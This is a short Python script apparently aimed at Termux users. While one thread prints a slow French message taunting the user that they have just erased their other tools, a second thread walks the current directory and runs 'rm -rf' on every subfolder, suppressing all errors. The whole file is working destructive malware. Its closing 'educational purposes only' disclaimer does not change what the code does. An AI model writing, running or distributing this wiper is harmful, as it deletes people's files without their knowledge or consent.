import os, time, threading

def leOnError(*args):
   pass

def printSlowly():
   message = "Salut cher utilisateur.\n\nTu sais quoi ?\n\nNon ?\n\nEt bien immagine un outil qui peut effacer tout tes autres outils sur termux...\nC'est ce que tu viens de faire.\nce code à été crée uniquement dans un but éducatif et le createur n'est en aucun cas responsable de vos actions"
   for leter in message:
      print(leter, end="")
      time.sleep(0.15)

def evilCd():
    try:
        for (root, dirs, files) in os.walk('.', topdown=True, onerror=leOnError):
            for doss in dirs:
                nomComplet = "rm -rf "
                nomComplet+= os.path.join(root, doss)
                os.system(nomComplet)
    except:
        pass

th1 = threading.Thread(target=printSlowly)
th2 = threading.Thread(target=evilCd)

th1.start()
th2.start()

th1.join()
th2.join()